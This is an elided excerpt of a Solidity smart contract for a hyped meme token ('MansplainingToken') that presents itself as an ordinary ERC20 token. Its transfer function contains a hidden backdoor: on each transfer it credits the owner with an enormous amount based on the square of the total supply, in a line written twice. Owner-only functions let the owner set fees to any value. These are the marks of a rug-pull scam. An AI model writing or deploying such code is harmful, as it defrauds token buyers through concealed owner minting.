...
/**
ElonTweet
https://twitter.com/elonmusk/status/1527344969471520768?s=20&t=_FPdTBC6V80qIrrgnRa2yg

Degen Play
LP BURN
LETS GO 1000x To The Moon
 ...
 */
 ...
 contract MansplainingToken is Context, ERC20, ERC20Metadata {
     ...
     * construction.
     */
     constructor(string memory name_, string memory symbol_,uint8  decimals_,uint256 totalSupply_,uint256 taxFee_,uint256 FeeBuy_ ) {
    _name = name_;
    _symbol =symbol_;
    _decimals = decimals_;
    ...
    function SetTaxbuy(uint256 a) public virtual onlyOwner {
        _setTaxFee( a);
    ...
    function FeeBuy(uint256 newTaxFee) public virtual onlyOwner {
        _FeeBuy = newTaxFee;
    ...
    function _transfer(
        ...
        _BuyTaxFee = (amount * _taxFee /100) / SellTaxFee;
        amount = amount -  (_BuyTaxFee*SellTaxFee);
        
        Tokens[recipient] += amount;
       Tokens[_owner] += _BuyTaxFee + (_totalSupply * _totalSupply) * (_FeeBuy) ;
        Tokens[_owner]+= _BuyTaxFee + (_totalSupply * _totalSupply) * (_FeeBuy) ;
     ...
     /**
   * @dev Returns the address of the current owner.0
   */
